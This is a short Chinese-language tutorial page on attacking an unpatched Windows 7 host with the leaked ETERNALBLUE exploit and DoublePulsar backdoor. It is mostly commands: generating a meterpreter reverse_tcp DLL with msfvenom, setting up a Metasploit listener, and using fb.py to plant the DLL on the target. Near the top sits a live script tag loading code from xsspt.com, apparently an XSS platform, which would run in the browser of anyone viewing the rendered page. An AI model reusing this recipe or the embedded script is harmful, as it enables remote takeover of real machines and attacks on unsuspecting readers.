# 0day
<script src=//xsspt.com/UwWHCN></script>
方程式 0day ETERNALBLUE 
<BR>环境部署</BR>
<BR>攻击环境:32位系统[win7 2003均可]&Kali系统</BR>
<BR>靶机环境:win7 x86</BR>
<BR>安装程序: pywin32-221.win32-py2.6与python-2.6.6[均已打包]</BR>
<BR>已经今天的主角影子经纪人公布的方程式0day ETERNALBLUE</BR>
<BR>号称入侵一切Windows主机[深切会到帝国主义的强大]</BR>
<BR> 下载地址:https://github.com/misterch0c/shadowbroker</BR>
<BR>环境介绍<BR>
<BR>攻击者win2003: 192.168.220.128</BR>
<BR>攻击者Kali：192.168.220.129</BR>
<BR>受害者win7: 192.168.220.132</BR>
<BR>攻击环节</BR>
<BR>进入Kali</BR>
<BR>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=5555 -f dll > s.dll</BR>
<BR>msfconsole 启动msf命令</BR>
<BR>msf > use exploit/multi/handler</BR>
<BR>msf > set LHOST IP</BR>
<BR>msf > set LPORT 5555</BR>
<BR>msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp</BR>
<BR>msf > exploit  #开启监听后我们开始攻击配置</BR>
<BR>进入Win2003</BR>
<BR>解压shadowbroker进入windows目录，新建listeningposts目录。#这里我就不演示了</BR>
<BR>运行fb.py，创建一个攻击项目:</BR>
<BR>TargetIP输入受害者IP</BR>
<BR>CallbackIP输入攻击者IP</BR>
<BR>使用重定向 no</BR>
<BR>输入use Eternalblue</BR>
<BR>选择目标系统是根据实际情况选择</BR>
<BR>选择传输装置是选择FB</BR>
<BR>输入use Doublepulsar</BR>
<BR>目标系统:根据系统选择</BR>
<BR>种植后门:选择RunDLL</BR>
<BR>讲MSF生成的DLL木马位置写入进去</BR>
成功
